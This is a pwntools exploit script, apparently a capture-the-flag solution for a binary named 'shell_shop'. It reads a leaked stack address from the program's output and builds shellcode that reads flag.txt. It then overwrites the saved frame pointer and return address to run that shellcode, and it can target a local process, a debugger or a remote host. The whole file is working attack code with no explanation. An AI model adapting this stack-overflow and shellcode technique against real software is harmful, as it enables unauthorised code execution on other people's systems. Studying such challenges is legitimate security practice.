from argparse import ArgumentParser as ap
from pwn import *



parser = ap()
subparsers = parser.add_subparsers(dest='subcommand')

local_parser = subparsers.add_parser('l')
debug_parser = subparsers.add_parser('d')
remote_parser = subparsers.add_parser('r')
remote_parser.add_argument("ip", type=str)
remote_parser.add_argument("port", type=int)
args = parser.parse_args()

context.arch = 'amd64'
e = ELF("shell_shop")
libc = ELF("glibc/libc.so.6")
rop = ROP(libc)

if args.subcommand == 'l':
    io = process("./shell_shop")
elif args.subcommand == 'd':
    io = gdb.debug("./shell_shop", gdbscript='continue')
elif args.subcommand == 'r':
    io = remote(args.ip, args.port)
else:
    raise SystemExit

io.recvrepeat(1)
io.sendline(b"2")
io.recvrepeat(1)
io.sendline(b"3")
output = io.recv()

leaked_addr = output.split(b'[')[1].split(b']')[0]
print(int(leaked_addr, 16))

leaked_addr = int(leaked_addr, 16)

rsp = p64(leaked_addr)
rbp = p64(leaked_addr + 16)

g = cyclic_gen()
#shellcode = asm(shellcraft.cat("flag.txt"))
shellcode = asm(shellcraft.cat("flag.txt"))
shellcode = asm('add rsp, 0x10') + shellcode
shellcode += (48 - len(shellcode)) * b'\x00'
io.send(b'y\0' + shellcode + rbp + rsp)
io.sendline()

io.interactive()


